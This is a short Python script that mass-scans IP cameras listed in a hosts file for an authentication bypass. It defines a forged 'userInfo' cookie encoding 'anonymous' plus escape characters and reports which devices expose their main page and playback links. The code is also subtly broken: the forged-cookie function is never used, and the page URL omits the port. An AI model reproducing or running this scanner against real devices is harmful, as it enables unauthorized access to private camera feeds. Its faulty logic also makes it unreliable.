import requests
import argparse
from urllib.parse import urlparse

def get_cookies(ip, port):
    session = requests.Session()
    try:
        session.get(f"http://{ip}:{port}/", timeout=5)
        return session.cookies
    except requests.exceptions.RequestException as e:
        print(f"Error connecting to {ip}:{port}")
        return None

def create_cookie(port):
    cookie_name = f"userInfo{port}"
    cookie_value = "YW5vbnltb3VzOlwxNzdcMTc3XDE3N1wxNzdcMTc3XDE3XDE3Nw=="
    return {cookie_name: cookie_value}

def access_main_page(ipcam, port, cookies):
    if cookies is None:
        return

    url = f"http://{ipcam}/doc/pages/main.asp"
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'}

    try:
        response = requests.get(url, cookies=cookies, headers=headers, timeout=5)
        if response.status_code == 200 and b'playback.asp' in response.content and b'<div id="mainFrame">' in response.content:
            print(f"[+] Access successful: {url}")
        else:
            print(f"[-] Access denied: {url}")
    except requests.exceptions.RequestException as e:
        print(f"Request error {url}")

def read_hosts_file(filename):
    with open(filename, "r") as file:
        return [line.strip().split(":") for line in file.readlines() if line.strip()]

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("hosts_file", help="Path to hosts.txt")
    args = parser.parse_args()

    hosts = read_hosts_file(args.hosts_file)
    for ip, port in hosts:
        cookies = get_cookies(ip, port)
        access_main_page(ip, port, cookies)